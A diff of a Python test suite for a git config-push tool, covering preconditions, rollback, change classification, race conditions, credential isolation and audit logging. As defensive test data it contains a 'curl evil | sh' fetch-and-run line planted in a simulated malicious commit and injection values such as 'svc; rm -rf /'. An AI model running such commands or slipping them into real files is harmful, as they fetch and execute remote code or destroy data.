@@ -1,34 +1,38 @@
-"""vikunja#363 — the push, and the seven guards standing between it and an unreviewed change.
-
-The tool committed to local main and stopped, because the calling agent has no git write
-access. So `committed: true` described an operation nobody could finish.
+"""The config write path (push.py): precondition, commit, classify, guard, push, roll back.
 
 These build real git repositories on disk (a bare "remote" plus a working clone) rather
 than mocking subprocess, because every guard here is a statement about what git actually
 reports — an assertion against a mock would pass just as happily if the argv were wrong.
-No network: the remote is a local bare repo, so no deploy key is exercised.
+No network: the remote is a local bare repo, so no deploy key is exercised. Where a
+failure has to be injected (a rejected push, a concurrent commit), it is done with a real
+pre-receive hook or a real commit, not a faked return code, wherever git allows it.
 """
 
 from __future__ import annotations
 
+import json
 import subprocess
 from pathlib import Path
 
 import pytest
+import yaml
 
+from doc_cache_mcp import push as push_mod
 from doc_cache_mcp.push import (
+    GitTarget,
     PushRefused,
-    _pr_url,
+    classify_change,
+    commit_change,
     emit_audit_event,
     identity_args,
     inspect_push_range,
-    push_config_commit,
-    validate_additive,
+    precondition,
 )
 
 IDENT_NAME = "doc-cache-mcp"
 IDENT_EMAIL = "doc-cache-mcp@forge"
 CONFIG_REL = "scripts/doc-sync.yml"
+BASE = "services:\n  a:\n  - topic: t\n    url: https://docs.example.com/a\n"
 
 
 def _run(repo: Path, *args: str) -> str:
@@ -45,41 +49,68 @@ def _commit(repo: Path, path: str, content: str, *, name: str, email: str, msg: 
     _run(repo, "-c", f"user.name={name}", "-c", f"user.email={email}", "commit", "-m", msg)
 
 
-@pytest.fixture
-def repo(tmp_path) -> Path:
-    """A working repo whose `origin` is a local bare repo, already in sync."""
-    bare = tmp_path / "remote.git"
-    subprocess.run(
-        ["git", "init", "--bare", "-b", "main", str(bare)], check=True, capture_output=True
-    )
+def _human(repo: Path, path: str, content: str, msg: str = "human") -> None:
+    _commit(repo, path, content, name="Ted", email="ted@example.com", msg=msg)
 
+
+@pytest.fixture
+def bare(tmp_path) -> Path:
+    b = tmp_path / "remote.git"
+    subprocess.run(["git", "init", "--bare", "-b", "main", str(b)], check=True, capture_output=True)
+    return b
+
+
+@pytest.fixture
+def repo(tmp_path, bare) -> Path:
+    """A working repo whose `origin` is a local bare repo, already in sync."""
     work = tmp_path / "work"
     subprocess.run(["git", "init", "-b", "main", str(work)], check=True, capture_output=True)
     _run(work, "remote", "add", "origin", str(bare))
-    _commit(work, CONFIG_REL, "services: {}\n", name="Ted", email="ted@example.com", msg="initial")
+    _human(work, CONFIG_REL, BASE, "initial")
     _run(work, "push", "-u", "origin", "main")
+    (work / ".fake-key").write_text("not-a-real-key")
+    (work / ".git" / "info" / "exclude").write_text(".fake-key\n")
     return work
 
 
-def _push(repo: Path, **over):
-    kwargs = dict(
-        allowed_path=CONFIG_REL,
+def _target(repo: Path, **over) -> GitTarget:
+    kw = dict(
+        repo=repo,
+        rel=CONFIG_REL,
         remote="origin",
         branch="main",
+        identity_name=IDENT_NAME,
         identity_email=IDENT_EMAIL,
+        push=True,
         deploy_key=repo / ".fake-key",
-        review_branch_prefix="doc-cache-mcp/review",
         audit_dir=None,
-        service="svc",
     )
-    kwargs.update(over)
-    # The local bare remote needs no ssh; a present-but-unused key file satisfies the
-    # existence precondition without making this test depend on a real credential.
-    Path(kwargs["deploy_key"]).write_text("not-a-real-key")
-    return push_config_commit(repo, **kwargs)
+    kw.update(over)
+    return GitTarget(**kw)
 
 
-# --- guard 1: identity ---------------------------------------------------------------
+def _add_text(extra: str = "b") -> str:
+    return BASE + f"  {extra}:\n  - topic: t\n    url: https://docs.example.com/{extra}\n"
+
+
+def _change(t: GitTarget, text: str, expected: str = "additive") -> dict:
+    assert precondition(t) is None
+    return commit_change(
+        t, new_text=text, message="doc-cache: test", expected=expected, service="svc"
+    )
+
+
+def _level(repo: Path) -> bool:
+    return _run(repo, "rev-parse", "HEAD") == _run(repo, "rev-parse", "origin/main")
+
+
+def _reject_pushes(bare: Path) -> None:
+    hook = bare / "hooks" / "pre-receive"
+    hook.write_text("#!/bin/sh\necho 'rejected by test hook' >&2\nexit 1\n")
+    hook.chmod(0o755)
+
+
+# --- identity ------------------------------------------------------------------------
 
 
 def test_identity_args_are_per_invocation():
@@ -89,275 +120,145 @@ def test_identity_args_are_per_invocation():
 # --- the happy path ------------------------------------------------------------------
 
 
-def test_clean_additive_commit_is_pushed(repo):
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
+def test_additive_change_is_pushed(repo):
+    out = _change(_target(repo), _add_text())
 
-    out = _push(repo)
-
-    assert out["pushed"] is True, out
-    assert out["commits"] == 1
-    # The bug: [ahead 1] afterwards means the commit is still stranded.
-    assert _run(repo, "status", "-sb").splitlines()[0].strip() == "## main...origin/main"
+    assert out["outcome"] == "pushed", out
+    assert out["change"] == "additive"
+    assert out["reason"] is None
+    assert _run(repo, "rev-parse", "origin/main").strip() == out["sha"]
+    assert _level(repo)
+    assert _run(repo, "log", "-1", "--format=%ae").strip() == IDENT_EMAIL
 
 
-# --- guard 3: foreign commits --------------------------------------------------------
+def test_commit_is_path_limited(repo):
+    """Something else staged in the live checkout must not be swept into the tool's commit."""
+    (repo / "other.txt").write_text("staged by a human\n")
+    _run(repo, "add", "other.txt")
+
+    out = _change(_target(repo), _add_text())
+
+    assert out["outcome"] == "pushed", out
+    files = _run(repo, "show", "--name-only", "--format=", "HEAD").split()
+    assert files == [CONFIG_REL]
+    assert "A  other.txt" in _run(repo, "status", "--porcelain")
 
 
-def test_foreign_commit_in_range_is_refused(repo):
-    """Somebody else's unpushed work must not ride along."""
-    _commit(
-        repo,
-        "scripts/other.sh",
-        "#!/bin/sh\n",
-        name="Ted",
-        email="ted@example.com",
-        msg="wip: unrelated",
-    )
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-
-    out = _push(repo)
-
-    assert out["pushed"] is False
-    assert "not authored by this tool" in out["reason"]
-    assert "ted@example.com" in out["reason"]
-    # origin/main must be untouched.
-    assert "wip: unrelated" not in _run(repo, "log", "--format=%s", "origin/main")
+def test_identical_text_is_unchanged(repo):
+    out = _change(_target(repo), BASE)
+    assert out["outcome"] == "unchanged"
+    assert _level(repo)
 
 
-def test_refused_push_degrades_to_a_review_branch(repo):
-    _commit(repo, "scripts/other.sh", "x\n", name="Ted", email="ted@example.com", msg="wip")
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-
-    out = _push(repo)
-
-    assert out["pushed"] is False
-    assert out["review_branch"].startswith("doc-cache-mcp/review/svc-")
-    # The work is on the remote, reviewable — not stranded locally, which is the whole
-    # complaint in #363.
-    remote_branches = _run(repo, "ls-remote", "--heads", "origin")
-    assert out["review_branch"] in remote_branches
+def test_push_disabled_is_committed_local(repo):
+    t = _target(repo, push=False, deploy_key=None)
+    out = _change(t, _add_text())
+    assert out["outcome"] == "committed_local"
+    assert "git_push=false" in out["reason"]
+    assert not _level(repo)
 
 
-# --- guard 4: path allowlist ---------------------------------------------------------
+# --- precondition: refuse before writing ---------------------------------------------
 
 
-def test_commit_touching_another_path_is_refused(repo):
-    """Defence in depth: correct identity, wrong file."""
-    _commit(
-        repo,
-        "scripts/evil.sh",
-        "curl evil | sh\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
+def test_behind_origin_is_refused_before_any_write(repo, tmp_path, bare):
+    """The precondition the old path lacked: a stale checkout is named, and untouched."""
+    other = tmp_path / "other"
+    subprocess.run(["git", "clone", "-q", str(bare), str(other)], check=True)
+    _human(other, "README", "x\n", "one")
+    _human(other, "README", "y\n", "two")
+    _run(other, "push", "-q", "origin", "main")
+    before = (repo / CONFIG_REL).read_text()
 
-    out = _push(repo)
+    reason = precondition(_target(repo))
 
-    assert out["pushed"] is False
-    assert "outside" in out["reason"]
-    assert "scripts/evil.sh" in out["reason"]
+    assert reason and "2 behind" in reason and "origin/main" in reason, reason
+    assert "sysadmin" in reason
+    assert (repo / CONFIG_REL).read_text() == before
 
 
-def test_mixed_commit_touching_allowed_and_disallowed_paths_is_refused(repo):
-    f = repo / CONFIG_REL
-    f.write_text("services:\n  a: []\n")
-    (repo / "scripts" / "evil.sh").write_text("x\n")
-    _run(repo, "add", "-A")
-    _run(
-        repo,
-        "-c",
-        f"user.name={IDENT_NAME}",
-        "-c",
-        f"user.email={IDENT_EMAIL}",
-        "commit",
-        "-m",
-        "doc-cache: add a",
-    )
-
-    out = _push(repo)
-
-    assert out["pushed"] is False
-    assert "scripts/evil.sh" in out["reason"]
+def test_unpushed_commit_is_refused(repo):
+    """A stranded commit — the poisoned-range mechanism — stops the next call up front."""
+    _human(repo, "README", "local only\n")
+    reason = precondition(_target(repo))
+    assert reason and "1 ahead of" in reason, reason
 
 
-# --- guard 7: fail closed ------------------------------------------------------------
+def test_dirty_config_is_refused(repo):
+    (repo / CONFIG_REL).write_text(BASE + "# hand edit\n")
+    reason = precondition(_target(repo))
+    assert reason and "uncommitted changes" in reason
 
 
-def test_missing_deploy_key_refuses(repo, tmp_path):
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-    out = push_config_commit(
-        repo,
-        allowed_path=CONFIG_REL,
-        remote="origin",
-        branch="main",
-        identity_email=IDENT_EMAIL,
-        deploy_key=tmp_path / "nope",
-        review_branch_prefix="p",
-        audit_dir=None,
-        service="svc",
-    )
-    assert out["pushed"] is False
-    assert "deploy key not found" in out["reason"]
+def test_dirty_config_is_refused_even_without_push(repo):
+    (repo / CONFIG_REL).write_text(BASE + "# hand edit\n")
+    assert "uncommitted changes" in precondition(_target(repo, push=False, deploy_key=None))
 
 
-def test_unevaluable_range_refuses_rather_than_pushing(repo):
-    """An unreachable remote must be a refusal, not a pass.
+def test_wrong_branch_is_refused(repo):
+    _run(repo, "checkout", "-q", "-b", "elsewhere")
+    reason = precondition(_target(repo))
+    assert reason and "elsewhere" in reason
 
-    inspect_push_range fetches first precisely so the range is not computed against a
-    stale view; if that fetch cannot happen the guards have nothing trustworthy to
-    evaluate.
-    """
+
+def test_missing_deploy_key_is_refused(repo, tmp_path):
+    reason = precondition(_target(repo, deploy_key=tmp_path / "nope"))
+    assert reason and "deploy key not found" in reason
+
+
+def test_unreachable_remote_is_refused(repo):
     _run(repo, "remote", "set-url", "origin", str(repo / "does-not-exist.git"))
-    with pytest.raises(PushRefused, match="cannot fetch"):
-        inspect_push_range(
-            repo,
-            remote="origin",
-            branch="main",
-            allowed_path=CONFIG_REL,
-            identity_email=IDENT_EMAIL,
-            deploy_key=repo / ".fake-key",
-        )
+    assert "cannot fetch" in precondition(_target(repo))
 
 
-@pytest.mark.parametrize(
-    "bad", ["../../etc", "svc; rm -rf /", "svc name", "--force", "", "refs/heads/main"]
-)
-def test_hostile_service_name_is_refused_before_it_reaches_a_ref(repo, bad):
-    """IV-01. server.py validates first, but this is an exported function.
+# --- push failure: roll back this call's commit --------------------------------------
 
-    ``service`` is interpolated into a branch name on the degradation path, so a name that
-    escapes the intended namespace must not get that far.
+
+def test_rejected_push_rolls_back_the_commit_and_the_file(repo, bare):
+    pre = _run(repo, "rev-parse", "HEAD").strip()
+    _reject_pushes(bare)
+
+    out = _change(_target(repo), _add_text())
+
+    assert out["outcome"] == "rolled_back", out
+    assert out["sha"] is None
+    assert "rejected" in out["reason"]
+    assert _run(repo, "rev-parse", "HEAD").strip() == pre
+    assert (repo / CONFIG_REL).read_text() == BASE
+    assert _run(repo, "status", "--porcelain", "--", CONFIG_REL) == ""
+    # And the next call is not poisoned: the checkout is clean and level again.
+    assert precondition(_target(repo)) is None
+
+
+def test_rollback_refuses_to_discard_a_concurrent_commit(repo, bare, monkeypatch):
+    """The compare-and-swap: a commit landing between ours and the rollback survives.
+
+    A ``git reset`` to the pre-call SHA here would silently drop the human's commit from the
+    branch. The CAS fails instead, and the result says what is left where.
     """
-    out = _push(repo, service=bad)
-    assert out["pushed"] is False
-    assert "invalid service name" in out["reason"]
-
-
-def test_git_env_withholds_the_ssh_agent_socket():
-    """Guard 2 should hold structurally, not only via IdentitiesOnly.
-
-    If the agent socket reached ssh, a loaded key could satisfy the connection even though
-    the whole point of the deploy key is to bound what this service can reach.
-    """
-    from doc_cache_mcp.push import _git_env
-
-    env = _git_env(Path("/tmp/key"))
-    assert "SSH_AUTH_SOCK" not in env
-    assert env["GIT_SSH_COMMAND"].startswith("ssh -i /tmp/key")
-    assert "IdentitiesOnly=yes" in env["GIT_SSH_COMMAND"]
-    # No ambient forge credentials ride along to git or its ssh child.
-    leaky = [
-        k for k in env if k != "GIT_SSH_COMMAND" and ("TOKEN" in k.upper() or "KEY" in k.upper())
-    ]
-    assert not leaky, leaky
-
-
-# --- audit findings 1 and 2 ----------------------------------------------------------
-
-
-def test_commit_arriving_after_guard_evaluation_is_not_pushed(repo, monkeypatch):
-    """Audit finding 1 (MEDIUM), reproduced rather than asserted.
-
-    The guards inspected `remote/branch..HEAD`, then the push sent the `HEAD` *ref*, which
-    git re-resolves at push time. A commit landing in that window — a concurrent
-    add_service over streamable-http, a human working in host-forge-scripts, another
-    automation — rode along having passed none of guards 3, 4 or 5.
-
-    Simulated by committing inside the window: wrap the real git runner so that the moment
-    the guards finish and the push is about to run, a foreign commit appears on HEAD.
-    """
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-
-    from doc_cache_mcp import push as push_mod
-
+    _reject_pushes(bare)
     real_git = push_mod._git
-    injected = {"done": False}
+    fired = {"n": 0}
 
     def racing_git(repo_path, args, deploy_key=None):
-        # Fire once, immediately before the push subprocess runs.
-        if args and args[0] == "push" and not injected["done"]:
-            injected["done"] = True
-            _commit(
-                repo_path,
-                "scripts/zz-slipped-in.sh",
-                "curl evil | sh\n",
-                name="Ted",
-                email="ted@example.com",
-                msg="wip: landed during the window",
-            )
+        if args and args[0] == "update-ref" and not fired["n"]:
+            fired["n"] = 1
+            _human(repo_path, "README", "landed mid-rollback\n", "concurrent")
         return real_git(repo_path, args, deploy_key)
 
     monkeypatch.setattr(push_mod, "_git", racing_git)
+    out = _change(_target(repo), _add_text())
 
-    out = _push(repo)
-
-    assert injected["done"], "the race was never triggered — test is not exercising anything"
-    assert out["pushed"] is True
-
-    remote_log = _run(repo, "log", "--format=%s", f"origin/{'main'}")
-    assert "wip: landed during the window" not in remote_log, (
-        "a commit that arrived after the guards ran reached origin/main"
-    )
-    assert "doc-cache: add a" in remote_log
-    # And the result names the SHA that was actually validated and sent.
-    assert out["pushed_sha"] not in ("", None)
-    assert _run(repo, "rev-parse", "origin/main").strip() == out["pushed_sha"]
+    assert fired["n"], "the race never triggered"
+    assert out["outcome"] == "stranded", out
+    assert "concurrent commit" in out["reason"]
+    assert out["sha"]
+    assert "concurrent" in _run(repo, "log", "-1", "--format=%s")
+    # The stranded state is not silent for the next caller either.
+    assert "ahead of" in precondition(_target(repo))
 
 
-def test_push_subprocess_failure_does_not_raise(repo, monkeypatch):
-    """Audit finding 2 (MEDIUM).
-
-    An exception escaping here is caught upstream by doc_cache_add_service's broad handler,
-    which throws away an already-true `committed: True` and reports `committed: False` —
-    claiming nothing happened while the commit sits on disk.
-    """
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-
-    from doc_cache_mcp import push as push_mod
-
+def test_push_timeout_that_did_not_land_rolls_back(repo, monkeypatch):
     real_git = push_mod._git
 
     def exploding_git(repo_path, args, deploy_key=None):
@@ -366,282 +267,244 @@ def test_push_subprocess_failure_does_not_raise(repo, monkeypatch):
         return real_git(repo_path, args, deploy_key)
 
     monkeypatch.setattr(push_mod, "_git", exploding_git)
+    out = _change(_target(repo), _add_text())  # must not raise
 
-    out = _push(repo)  # must not raise
-
-    assert out["pushed"] is False
-    # A timeout may have landed server-side. Saying "failed" would be a guess.
-    assert "unknown" in out["reason"]
+    assert out["outcome"] == "rolled_back", out
+    assert "not on the remote" in out["reason"]
+    assert _level(repo)
 
 
-def test_review_branch_push_failure_does_not_raise(repo, monkeypatch):
-    """Same property on the degradation path — it also shells out to git."""
-    _commit(repo, "scripts/evil.sh", "x\n", name=IDENT_NAME, email=IDENT_EMAIL, msg="c")
-
-    from doc_cache_mcp import push as push_mod
-
+def test_push_timeout_that_did_land_is_pushed(repo, monkeypatch):
     real_git = push_mod._git
 
-    def exploding_git(repo_path, args, deploy_key=None):
+    def slow_git(repo_path, args, deploy_key=None):
         if args and args[0] == "push":
-            raise OSError("no fork for you")
+            real_git(repo_path, args, deploy_key)  # it lands, then the client times out
+            raise subprocess.TimeoutExpired(["git", "push"], 60)
         return real_git(repo_path, args, deploy_key)
 
-    monkeypatch.setattr(push_mod, "_git", exploding_git)
+    monkeypatch.setattr(push_mod, "_git", slow_git)
+    out = _change(_target(repo), _add_text())
 
-    out = _push(repo)  # must not raise
-
-    assert out["pushed"] is False
-    assert out["review_branch_error"]
+    assert out["outcome"] == "pushed", out
+    assert _level(repo)
 
 
-def test_skipped_additive_check_is_reported_not_silent(repo):
-    """Audit finding 3 (LOW). A guard that did not run must not look like one that passed."""
-    # Push a state where the config file does not exist upstream at all.
-    _run(repo, "rm", "--", CONFIG_REL)
-    _run(
+# --- change classification -----------------------------------------------------------
+
+
+def _cfg(**services):
+    return {"services": services}
+
+
+A = {"topic": "t", "url": "https://x/a"}
+B = {"topic": "u", "url": "https://x/b"}
+
+
+def test_classify_change_kinds():
+    assert classify_change(_cfg(s=[A]), _cfg(s=[A, B])) == "additive"
+    assert classify_change(_cfg(s=[A]), _cfg(s=[A], n=[B])) == "additive"
+    assert classify_change(None, _cfg(s=[A])) == "additive"
+    assert classify_change(_cfg(s=[A]), _cfg(s=[{**A, "url": "https://x/z"}])) == "repoint"
+    assert classify_change(_cfg(s=[A, B]), _cfg(s=[A])) == "remove"
+    assert classify_change(_cfg(s=[A], n=[B]), _cfg(s=[A])) == "remove"
+    assert classify_change(_cfg(s=[A]), _cfg(s=[{**A, "url": "https://x/z"}, B])) == "mixed"
+    assert classify_change(_cfg(s=[A]), _cfg(s=[A])) == "none"
+
+
+def test_change_of_the_wrong_kind_is_rolled_back(repo):
+    """An add that would repoint (a bug in a caller) cannot land as an add."""
+    repoint = BASE.replace("/a\n", "/elsewhere\n")
+    out = _change(_target(repo), repoint, expected="additive")
+
+    assert out["outcome"] == "rolled_back", out
+    assert out["change"] == "repoint"
+    assert "only makes 'additive'" in out["reason"]
+    assert _level(repo)
+    assert (repo / CONFIG_REL).read_text() == BASE
+
+
+def test_repoint_pushes_when_it_is_the_expected_kind(repo):
+    out = _change(_target(repo), BASE.replace("/a\n", "/elsewhere\n"), expected="repoint")
+    assert out["outcome"] == "pushed", out
+    assert out["change"] == "repoint"
+
+
+def test_repoint_then_add_both_push_and_the_second_reason_is_its_own(repo):
+    """The poisoned-range bug, end to end at the push layer (vikunja#653).
+
+    v0.2.2: a repoint degraded to a review branch and stayed on local main, so the next,
+    perfectly additive call's push range contained it — and that call degraded too, with a
+    reason describing the repoint.
+    """
+    t = _target(repo)
+    first = _change(t, BASE.replace("/a\n", "/elsewhere\n"), expected="repoint")
+    second_text = yaml.safe_load((repo / CONFIG_REL).read_text())
+    second_text["services"]["b"] = [{"topic": "t", "url": "https://docs.example.com/b"}]
+    second = _change(t, yaml.safe_dump(second_text, sort_keys=False), expected="additive")
+
+    assert first["outcome"] == "pushed", first
+    assert second["outcome"] == "pushed", second
+    assert second["reason"] is None
+    assert second["change"] == "additive"
+    assert _level(repo)
+
+
+# --- guards on the push range --------------------------------------------------------
+
+
+def _inspect(repo: Path):
+    return inspect_push_range(
         repo,
-        "-c",
-        f"user.name={IDENT_NAME}",
-        "-c",
-        f"user.email={IDENT_EMAIL}",
-        "commit",
-        "-m",
-        "doc-cache: drop",
+        remote="origin",
+        branch="main",
+        allowed_path=CONFIG_REL,
+        identity_email=IDENT_EMAIL,
+        deploy_key=repo / ".fake-key",
     )
-    _run(repo, "push", "origin", "main")
 
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-    out = _push(repo)
 
-    assert out["pushed"] is True
-    assert any("additive check skipped" in n for n in out.get("notes", [])), out
+def test_foreign_commit_in_range_is_refused(repo):
+    """Somebody else's unpushed work must not ride along."""
+    _human(repo, "scripts/other.sh", "#!/bin/sh\n", "wip: unrelated")
+    _commit(repo, CONFIG_REL, _add_text(), name=IDENT_NAME, email=IDENT_EMAIL, msg="add")
+    with pytest.raises(PushRefused, match=r"not authored by this tool.*ted@example\.com"):
+        _inspect(repo)
+
+
+def test_commit_touching_another_path_is_refused(repo):
+    _commit(repo, "scripts/evil.sh", "x\n", name=IDENT_NAME, email=IDENT_EMAIL, msg="c")
+    with pytest.raises(PushRefused, match=r"scripts/evil\.sh"):
+        _inspect(repo)
+
+
+def test_mixed_commit_touching_allowed_and_disallowed_paths_is_refused(repo):
+    (repo / "scripts" / "evil.sh").write_text("x\n")
+    (repo / CONFIG_REL).write_text(_add_text())
+    _run(repo, "add", "-A", "scripts")
+    _run(repo, *identity_args(IDENT_NAME, IDENT_EMAIL), "commit", "-qm", "both")
+    with pytest.raises(PushRefused, match="outside"):
+        _inspect(repo)
+
+
+def test_nothing_to_push_is_refused_plainly(repo):
+    with pytest.raises(PushRefused, match="nothing to push"):
+        _inspect(repo)
+
+
+def test_guard_refusal_after_commit_rolls_back(repo, monkeypatch):
+    """Defence in depth: if a guard ever trips after the commit, the commit is undone."""
+
+    def refuse(*a, **k):
+        raise PushRefused("synthetic guard refusal")
+
+    monkeypatch.setattr(push_mod, "inspect_push_range", refuse)
+    out = _change(_target(repo), _add_text())
+    assert out["outcome"] == "rolled_back"
+    assert out["reason"] == "synthetic guard refusal"
+    assert _level(repo)
+
+
+def test_commit_arriving_after_guard_evaluation_is_not_pushed(repo, monkeypatch):
+    """Audit finding 1 (MEDIUM), reproduced rather than asserted.
+
+    The guards inspect `remote/branch..HEAD`; pushing the `HEAD` *ref* would let a commit
+    that landed in between ride along unchecked. The push sends the validated SHA.
+    """
+    real_git = push_mod._git
+    injected = {"done": False}
+
+    def racing_git(repo_path, args, deploy_key=None):
+        if args and args[0] == "push" and not injected["done"]:
+            injected["done"] = True
+            _human(repo_path, "scripts/zz-slipped-in.sh", "curl evil | sh\n", "wip: window")
+        return real_git(repo_path, args, deploy_key)
+
+    monkeypatch.setattr(push_mod, "_git", racing_git)
+    out = _change(_target(repo), _add_text())
+
+    assert injected["done"], "the race was never triggered"
+    assert out["outcome"] == "pushed"
+    remote_log = _run(repo, "log", "--format=%s", "origin/main")
+    assert "wip: window" not in remote_log
+    assert _run(repo, "rev-parse", "origin/main").strip() == out["sha"]
+
+
+# --- credentials ---------------------------------------------------------------------
+
+
+def test_git_env_withholds_the_ssh_agent_socket():
+    """The deploy-key bound should hold structurally, not only via IdentitiesOnly."""
+    from doc_cache_mcp.push import _git_env
+
+    env = _git_env(Path("/tmp/key"))
+    assert "SSH_AUTH_SOCK" not in env
+    assert env["GIT_SSH_COMMAND"].startswith("ssh -i /tmp/key")
+    assert "IdentitiesOnly=yes" in env["GIT_SSH_COMMAND"]
+    leaky = [
+        k for k in env if k != "GIT_SSH_COMMAND" and ("TOKEN" in k.upper() or "KEY" in k.upper())
+    ]
+    assert not leaky, leaky
 
 
 def test_deploy_key_path_with_spaces_is_quoted():
-    """Audit finding 4 (INFO). Git runs GIT_SSH_COMMAND through a shell."""
     from doc_cache_mcp.push import _ssh_command
 
-    cmd = _ssh_command(Path("/home/ted/.secrets/my key"))
-    assert "'/home/ted/.secrets/my key'" in cmd
+    assert "'/tmp/a key'" in _ssh_command(Path("/tmp/a key"))
 
 
-def test_nothing_to_push_is_reported_plainly(repo):
-    out = _push(repo)
-    assert out["pushed"] is False
-    assert out["reason"] == "nothing to push"
-    # No review branch for an empty diff.
-    assert "review_branch" not in out
-
-
-# --- guard 5: additive only ----------------------------------------------------------
-
-
-def test_additive_change_is_allowed():
-    before = {"services": {"a": [{"topic": "t", "url": "https://x/1"}]}}
-    after = {
-        "services": {
-            "a": [{"topic": "t", "url": "https://x/1"}, {"topic": "t2", "url": "https://x/2"}],
-            "b": [{"topic": "t", "url": "https://y/1"}],
-        }
-    }
-    assert validate_additive(before, after) is None
-
-
-def test_removing_a_service_is_refused():
-    before = {"services": {"a": [], "b": []}}
-    assert "remove service 'b'" in validate_additive(before, {"services": {"a": []}})
-
-
-def test_removing_a_topic_is_refused():
-    before = {"services": {"a": [{"topic": "t", "url": "https://x/1"}]}}
-    assert "remove topic 't'" in validate_additive(before, {"services": {"a": []}})
-
-
-def test_repointing_an_existing_url_is_refused():
-    """A URL swap on an existing topic is what cache poisoning looks like."""
-    before = {"services": {"a": [{"topic": "t", "url": "https://good/1"}]}}
-    after = {"services": {"a": [{"topic": "t", "url": "https://evil/1"}]}}
-    assert "change the url" in validate_additive(before, after)
-
-
-def test_reasserting_an_identical_url_is_allowed():
-    same = {"services": {"a": [{"topic": "t", "url": "https://x/1"}]}}
-    assert validate_additive(same, same) is None
-
-
-def test_empty_before_is_allowed():
-    assert validate_additive({}, {"services": {"a": []}}) is None
-
-
-def test_repointing_a_url_degrades_rather_than_pushing(repo):
-    """Guard 5 at push time, against the remote's copy — not this process's memory.
-
-    Replacing an existing topic's URL is documented, tested behaviour of
-    doc_cache_add_service, so it must stay possible. It just must not land unattended:
-    it goes to a review branch instead.
-    """
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a:\n    - topic: t\n      url: https://good/1\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-    assert _push(repo)["pushed"] is True
-
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a:\n    - topic: t\n      url: https://evil/1\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-    out = _push(repo)
-
-    assert out["pushed"] is False
-    assert "change the url" in out["reason"]
-    assert out["review_branch"]
-    # origin/main still has the original URL.
-    assert "https://good/1" in _run(repo, "show", f"origin/main:{CONFIG_REL}")
-
-
-def test_removing_a_service_degrades_rather_than_pushing(repo):
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n  b: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a and b",
-    )
-    assert _push(repo)["pushed"] is True
-
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a: []\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-    out = _push(repo)
-
-    assert out["pushed"] is False
-    assert "remove service 'b'" in out["reason"]
-    assert "b:" in _run(repo, "show", f"origin/main:{CONFIG_REL}")
-
-
-def test_adding_a_topic_to_an_existing_service_still_pushes(repo):
-    """The normal case must not be caught by guard 5."""
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a:\n    - topic: t\n      url: https://x/1\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-    assert _push(repo)["pushed"] is True
-
-    _commit(
-        repo,
-        CONFIG_REL,
-        "services:\n  a:\n    - topic: t\n      url: https://x/1\n"
-        "    - topic: t2\n      url: https://x/2\n",
-        name=IDENT_NAME,
-        email=IDENT_EMAIL,
-        msg="doc-cache: add a",
-    )
-    assert _push(repo)["pushed"] is True
-
-
-# --- guard 6: audit trail ------------------------------------------------------------
+# --- audit trail ---------------------------------------------------------------------
 
 
 def test_audit_event_is_written(tmp_path):
-    import json
-
-    err = emit_audit_event(tmp_path, "pushed something", {"service": "svc", "commits": ["abc"]})
+    err = emit_audit_event(tmp_path, "pushed something", {"service": "svc"})
     assert err is None
     files = list(tmp_path.glob("*-cross-agent.jsonl"))
     assert len(files) == 1
     event = json.loads(files[0].read_text().strip())
     assert event["source"] == "doc-cache-mcp"
-    assert event["summary"] == "pushed something"
+    assert event["event"] == "artifact.untracked"
     assert event["metadata"]["service"] == "svc"
-    assert event["id"] and event["ts"]
+
+
+def test_audit_event_name_is_settable(tmp_path):
+    emit_audit_event(tmp_path, "x", {}, event="doc-cache.provisional.added")
+    event = json.loads(next(tmp_path.glob("*.jsonl")).read_text())
+    assert event["event"] == "doc-cache.provisional.added"
 
 
 def test_audit_is_a_noop_when_unconfigured():
     assert emit_audit_event(None, "x", {}) is None
 
 
-def test_audit_failure_is_reported_not_swallowed(tmp_path):
-    """An unwritable sink must surface, but must not veto an already-guarded push."""
+def test_audit_failure_is_reported_counted_and_not_swallowed(tmp_path, monkeypatch):
+    """vikunja#380: a failing sink is an ERROR log plus a metric an alert can watch."""
+    seen = []
+    monkeypatch.setattr(push_mod, "emit_metric", lambda m, t, f: seen.append((m, f)))
     blocker = tmp_path / "blocked"
     blocker.write_text("i am a file, not a directory")
+
     err = emit_audit_event(blocker, "x", {})
-    assert err is not None
-    assert "audit event not written" in err
+
+    assert err and "audit event not written" in err
+    assert seen == [("doc_cache_audit_sink_errors_total", {"count": 1})]
 
 
-def test_push_result_surfaces_an_audit_failure(repo, tmp_path):
